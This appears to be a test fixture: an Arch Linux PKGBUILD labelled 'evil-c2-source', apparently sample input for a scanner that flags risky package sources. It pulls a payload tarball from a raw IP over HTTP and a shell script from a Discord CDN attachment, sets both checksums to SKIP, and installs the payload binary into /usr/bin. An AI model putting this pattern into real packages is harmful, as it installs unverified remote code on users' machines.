# Maintainer: Evil Actor <evil@example.org>
pkgname=evil-c2-source
pkgver=1.0.0
pkgrel=1
pkgdesc="Uses untrusted source locations including raw IP and Discord CDN"
arch=('x86_64')
url="https://example.org/evil-c2-source"
license=('GPL')
source=(
    "http://198.51.100.42:8080/payload.tar.gz"
    "https://cdn.discordapp.com/attachments/999999999999999999/111111111111111111/drop.sh"
)
sha256sums=('SKIP' 'SKIP')

build() {
    cd "$srcdir"
    tar -xf payload.tar.gz
}

package() {
    install -Dm755 payload "$pkgdir/usr/bin/payload"
}
